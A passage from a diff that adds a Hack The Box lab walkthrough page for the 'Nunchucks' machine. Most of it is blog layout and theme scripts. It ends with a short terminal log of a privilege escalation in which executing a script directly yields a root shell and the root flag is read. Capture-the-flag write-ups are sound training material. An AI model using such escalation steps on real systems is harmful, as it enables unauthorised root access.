class="line"><span class="string">david@nunchucks:/tmp$ /usr/bin/perl ./a.pl </span></span><br><span class="line"><span class="string">Can&#x27;</span>t open perl script <span class="string">&quot;./a.pl&quot;</span>: Permission denied</span><br><span class="line">david@nunchucks:/tmp$ ./a.pl </span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">d44............................</span><br></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Nunchucks</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Nunchucks.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTHeBox-Object.html" title="HTB Walkthrough - Object">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Object</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-NodeBlog.html" title="HTB Walkthrough - NodeBlog">
+                        <span class="hidden-mobile">HTB Walkthrough - NodeBlog</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
